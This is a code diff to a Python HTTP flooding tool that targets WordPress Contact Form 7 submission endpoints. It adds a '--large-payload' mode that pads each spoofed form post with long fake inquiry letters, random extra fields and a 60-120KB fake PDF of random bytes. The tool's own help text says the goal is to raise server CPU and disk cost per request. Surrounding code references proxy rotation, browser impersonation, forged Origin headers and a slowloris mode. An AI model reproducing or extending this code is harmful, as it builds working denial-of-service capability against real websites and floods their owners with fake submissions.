@@ -146,6 +146,8 @@ FIXED_PROFILE = None
 # differently under flood than the always-uncached CF7 POST.
 HOMEPAGE_MODE = False
 
+LARGE_PAYLOAD = False
+
 
 # ─────────────────────────────────────────────────────────────────────────────
 #  PROXY POOL
@@ -246,14 +248,161 @@ _EMAIL_DOMAINS = ["gmail.com","yahoo.com","outlook.com","hotmail.com","icloud.co
 _SUBJECTS = ["Question about your services","Inquiry","Contact request","Need some information",
              "Quick question","Following up","Reaching out","General inquiry","Request for info","Hello"]
 _MESSAGE_TEMPLATES = [
-    "Hi, I wanted to reach out and ask a few questions. Could you get back to me when you have a moment?",
-    "Hello, I came across your site and had a question. Please let me know if you can help.",
-    "Hi there, I'm interested in learning more. Looking forward to your response.",
-    "Good day, I have a quick question and would appreciate a reply when convenient.",
-    "Hello, just reaching out to see if you could provide some additional details. Thanks!",
-    "Hi, I'd like more information on this. Let me know the best way to follow up.",
-    "Hello, hoping to get in touch regarding a question I had. Thanks in advance.",
-    "Hi, wanted to check in and ask something. Appreciate any info you can share.",
+    (
+        "Hello,\n\nI recently came across your website and I'm very interested in learning more about "
+        "what you offer. I have several questions that I hope you can help me with at your earliest "
+        "convenience.\n\nFirst, I'd like to understand the full scope of services available. Could you "
+        "provide a detailed breakdown of what's included and any options or packages that might be "
+        "relevant to my situation? I've looked through the information on your site but still have "
+        "some gaps I'd like to fill before moving forward.\n\nSecond, I was wondering about the "
+        "process for getting started — what are the typical timelines and what should I expect during "
+        "the initial stages? Are there any prerequisites or steps I should take on my end to prepare?\n\n"
+        "Third, I'm curious about pricing and whether there are any options for customization based "
+        "on specific needs. I'd also appreciate knowing whether there are any introductory offers or "
+        "consultations available for new clients.\n\nFinally, if you have any case studies, testimonials, "
+        "or examples of past work you could share, that would be tremendously helpful in my decision-making "
+        "process. I want to make sure I'm making the right choice.\n\nThank you for taking the time to "
+        "read this message. I look forward to your response and hope we can connect soon to discuss further.\n\n"
+        "Best regards,"
+    ),
+    (
+        "Hi there,\n\nI hope this message finds you well. My name is [name] and I'm reaching out because "
+        "I came across your website while searching for services in this area. I was immediately impressed "
+        "by what I saw and wanted to get in touch to ask a few specific questions before proceeding.\n\n"
+        "To give you some background: I've been exploring various options for quite some time now and "
+        "haven't found exactly what I'm looking for. Your site caught my attention because it seemed "
+        "to address several of the key points that matter most to me.\n\nMy questions are as follows:\n"
+        "1. What is the typical response time once I submit an inquiry?\n"
+        "2. Do you work with clients in my area or is this primarily a remote service?\n"
+        "3. Are there any minimum requirements or commitments involved?\n"
+        "4. How do you handle situations where the initial expectations aren't met?\n"
+        "5. What sets you apart from other providers offering similar services?\n\n"
+        "I realize this is quite a few questions, so please feel free to answer at whatever level of "
+        "detail is convenient for you. Even a brief overview would be a good starting point.\n\n"
+        "I'm looking forward to hearing back from you. Please don't hesitate to reach out by phone "
+        "or email if that would be easier. Thank you again for your time and consideration.\n\n"
+        "Warm regards,"
+    ),
+    (
+        "Good day,\n\nI'm writing to express my interest in the services your organization provides. "
+        "I've done some initial research and believe there may be a good fit here, but I'd like to "
+        "gather more information before committing to anything.\n\nOver the past few months I've been "
+        "evaluating a number of options and have narrowed my search down to a shortlist of providers, "
+        "of which you are one. The key factors I'm weighing include reliability, communication, "
+        "turnaround time, and overall value for money.\n\nI have a few specific questions I'd love "
+        "answered if possible:\n\n- Can you walk me through what a typical engagement looks like from "
+        "start to finish?\n- How do you communicate progress or updates throughout the process?\n"
+        "- What happens if something doesn't go as planned or if revisions are needed?\n"
+        "- Do you have any references I could speak with who have used your services in a similar capacity?\n\n"
+        "Additionally, I'd like to understand what the onboarding process looks like and what you'd "
+        "need from me to get things moving quickly. I'm hoping to make a decision within the next "
+        "two to three weeks.\n\nPlease feel free to share any brochures, proposals, or additional "
+        "materials that might be useful. I'll review everything carefully before following up.\n\n"
+        "Thank you very much for your assistance and I hope to speak with you soon.\n\nSincerely,"
+    ),
+    (
+        "Hello,\n\nI hope you don't mind me reaching out directly. I found your contact information "
+        "on your website and wanted to get in touch with some questions that I couldn't find answers "
+        "to in your FAQ or existing resources.\n\nI'm currently in the planning stages of a project "
+        "and I believe your expertise could be exactly what I need. However, before I move forward, "
+        "I want to make sure I fully understand the scope and limitations of what you offer.\n\n"
+        "Specifically, I'd like to know:\n\n1. Do you offer consultations prior to engagement, and "
+        "if so, is there a fee associated with that?\n2. What is your current availability like? I'm "
+        "hoping to begin within the next month or so.\n3. Are contracts or agreements involved, or is "
+        "this handled on a more informal basis?\n4. How do payments typically work — is it upfront, "
+        "milestone-based, or upon completion?\n5. Do you have experience with projects similar to "
+        "what I have in mind?\n\nI'd also love to schedule a brief call if that's possible, even "
+        "just 15-20 minutes to discuss things at a high level. That would help me determine if "
+        "this is the right direction to pursue.\n\nThank you so much for your time. I look forward "
+        "to hearing from you and appreciate your willingness to engage with potential clients at "
+        "this stage.\n\nBest,"
+    ),
+    (
+        "Hi,\n\nI came across your site recently and wanted to reach out. I have a few questions "
+        "and would appreciate any information you could share.\n\nBackground on my situation: I've "
+        "been looking into this for several months and have spoken with a few different providers. "
+        "I haven't committed to anything yet because I want to make sure I find the right fit for "
+        "my specific needs, which are somewhat particular.\n\nThe main things I'm trying to understand "
+        "are: the overall process from inquiry to completion, expected timelines, what support looks "
+        "like during and after, and how issues or changes are handled mid-way through.\n\n"
+        "I'm also keen to understand what makes your approach different from others I might be "
+        "considering. Not looking for a sales pitch — just an honest overview of your strengths "
+        "and any limitations I should be aware of upfront.\n\nIf you have availability for a brief "
+        "chat this week or next, I'd welcome that. Otherwise, a detailed written response to the "
+        "points above would be very helpful and much appreciated.\n\nThank you for reading and I "
+        "hope to hear from you soon.\n\nKind regards,"
+    ),
+    (
+        "Hello,\n\nI'm reaching out because I'd like to learn more about what you do and whether "
+        "it might be a good match for what I need. I found your website through a search and was "
+        "encouraged by what I read there.\n\nI have a number of questions, some of which are fairly "
+        "detailed, so I apologize in advance for the length of this message. I want to be thorough "
+        "so that you can give me the most accurate information possible.\n\nFirstly, can you tell me "
+        "more about your background and experience in this area? How long have you been operating and "
+        "what types of clients do you typically work with? Are there particular industries or situations "
+        "where you specialize?\n\nSecondly, I'd like to understand the typical workflow. Once I reach "
+        "out and we determine there's a fit, what happens next? What are the key steps, and roughly "
+        "how long does each stage take?\n\nThirdly, what does success look like from your perspective? "
+        "How do you measure outcomes and what does a positive result typically look like for a client?\n\n"
+        "Finally, I'd be curious about any common pitfalls or mistakes you've seen clients make that "
+        "I should be aware of going in.\n\nThank you for considering my questions. I'm genuinely "
+        "interested and hope we can have a productive conversation.\n\nAll the best,"
+    ),
+    (
+        "Dear team,\n\nI'm writing to request some information about your services. I've been "
+        "referred to you by a colleague who spoke highly of their experience, and I'm now exploring "
+        "whether this might be appropriate for my own situation.\n\nI'll try to be as specific as "
+        "possible about what I'm looking for so you can give me the most useful response.\n\n"
+        "My primary concern at this stage is understanding the basics: what's included, what's not, "
+        "and what the realistic expectations should be for someone in my position. I've seen some "
+        "information on your site but still have gaps that I'm hoping you can fill.\n\n"
+        "Some of my key questions:\n- What's the best way to get started if I decide to proceed?\n"
+        "- Is there a waiting list or can you typically accommodate new clients quickly?\n"
+        "- How do you handle situations where things don't go as expected?\n"
+        "- Are there any additional costs I should anticipate beyond the primary service fee?\n"
+        "- Do you offer any kind of guarantee or assurance of quality?\n\n"
+        "I'd appreciate as much detail as you're able to provide. I'm in the process of making a "
+        "decision and your response will help me determine whether to move forward with you or "
+        "continue looking at other options.\n\nThank you very much for your time and I look forward "
+        "to your reply.\n\nWith appreciation,"
+    ),
+    (
+        "Hi,\n\nI hope this finds you well. I wanted to take a moment to reach out and introduce "
+        "myself and explain why I'm contacting you today.\n\nI've been doing a fair amount of "
+        "research in this space over the past few weeks and have been impressed by several providers, "
+        "including yourself. I'm now at the stage where I need to start making some decisions and "
+        "wanted to gather a bit more information before doing so.\n\nMy questions are varied but "
+        "all relate to understanding what it would be like to work with you:\n\n"
+        "1. How responsive is your team typically? What's the best way to get in touch if I need "
+        "a quick answer to something?\n"
+        "2. How do you handle feedback and revisions? Is there a defined process for this?\n"
+        "3. What's your policy if I'm not satisfied with the results?\n"
+        "4. Can you share examples of work you've done for clients with needs similar to mine?\n"
+        "5. What does the communication look like throughout the engagement — weekly updates, "
+        "on-demand, or something else?\n\n"
+        "I realize these are fairly standard questions, but I find that the answers tell me a lot "
+        "about how a provider operates and whether they'd be a good match for my working style.\n\n"
+        "Looking forward to your response. Please feel free to reach out if you'd prefer to talk "
+        "through things over a call rather than back and forth by email.\n\nThanks,"
+    ),
+]
+
+_EXTRA_FIELD_KEYS = [
+    "company", "phone", "website", "city", "country", "zip-code",
+    "how-did-you-hear", "budget", "timeline", "additional-notes",
+    "preferred-contact", "availability", "project-type", "referral-source",
+]
+_EXTRA_FIELD_VALUES = [
+    "Yes, please follow up at your earliest convenience.",
+    "Flexible — open to discussing options further.",
+    "Within the next 30 days ideally.",
+    "No strong preference, whatever works best for your team.",
+    "Happy to provide more details if needed.",
+    "Please feel free to reach out by phone or email.",
+    "This is quite time-sensitive so a prompt reply would be appreciated.",
+    "Referral from a colleague — they spoke very highly of you.",
+    "Saw your listing online and was impressed by the reviews.",
+    "Have been considering this for a while and finally ready to proceed.",
 ]
 
 def random_payload_fields():
@@ -283,7 +432,21 @@ def build_files(form_id, unit_tag):
     }
 
 
-def build_multipart(form_id, unit_tag):
+_FAKE_FILENAMES = [
+    "resume.pdf", "cv.pdf", "document.pdf", "attachment.pdf",
+    "inquiry.pdf", "request.pdf", "application.pdf", "form.pdf",
+    "portfolio.pdf", "reference.pdf", "info.pdf", "letter.pdf",
+]
+
+def _fake_pdf_bytes(size_kb):
+    """Generate a plausible-looking PDF wrapper around random bytes."""
+    header = b"%PDF-1.4\n%\xe2\xe3\xcf\xd3\n"
+    trailer = b"\n%%EOF\n"
+    padding = os.urandom(max(0, size_kb * 1024 - len(header) - len(trailer)))
+    return header + padding + trailer
+
+
+def build_multipart(form_id, unit_tag, large_payload=False):
     """curl_cffi needs CurlMime, not the requests-style files dict."""
     f = random_payload_fields()
     mp = CurlMime()
@@ -295,6 +458,18 @@ def build_multipart(form_id, unit_tag):
     mp.addpart(name="your-email", data=f["email"])
     mp.addpart(name="your-subject", data=f["subject"])
     mp.addpart(name="your-message", data=f["message"])
+    if large_payload:
+        extra_keys = random.sample(_EXTRA_FIELD_KEYS, k=random.randint(4, 8))
+        for key in extra_keys:
+            mp.addpart(name=key, data=random.choice(_EXTRA_FIELD_VALUES))
+        fname    = random.choice(_FAKE_FILENAMES)
+        size_kb  = random.randint(60, 120)
+        mp.addpart(
+            name="your-file",
+            data=_fake_pdf_bytes(size_kb),
+            filename=fname,
+            content_type="application/pdf",
+        )
     return mp
 
 
@@ -329,7 +504,7 @@ def send_one(req_num, cfg, pool):
         else:
             r = cf_requests.post(
                 cfg["url"],
-                multipart=build_multipart(cfg["form_id"], cfg["unit_tag"]),
+                multipart=build_multipart(cfg["form_id"], cfg["unit_tag"], large_payload=LARGE_PAYLOAD),
                 headers={"Origin": f"https://{domain}", "Referer": f"https://{domain}/", "User-Agent": ua},
                 proxies={"http": proxy, "https": proxy} if proxy else None,
                 impersonate=impersonate,
@@ -580,6 +755,11 @@ def main():
                         "feedback endpoint. Same concurrency/proxy/profile rotation —\n"
                         "isolates whether a cached GET behaves differently under\n"
                         "flood than the always-uncached CF7 POST.")
+    p.add_argument("--large-payload", action="store_true",
+                   help="Inflate each request: multi-paragraph message (~3KB),\n"
+                        "4-8 extra form fields, and a fake PDF attachment (60-120KB).\n"
+                        "Forces PHP to parse a larger multipart body + write a temp file\n"
+                        "per request — increases per-worker CPU/disk time.")
     p.add_argument("--verbose",     action="store_true",
                    help="Show every request")
     p.add_argument("--delay",       type=float, default=0,
@@ -613,6 +793,10 @@ def main():
     if args.homepage:
         global HOMEPAGE_MODE
         HOMEPAGE_MODE = True
+
+    if args.large_payload:
+        global LARGE_PAYLOAD
+        LARGE_PAYLOAD = True
 
     # ── slowloris: domain not required, can run standalone with --origin ─────
     if args.slowloris:
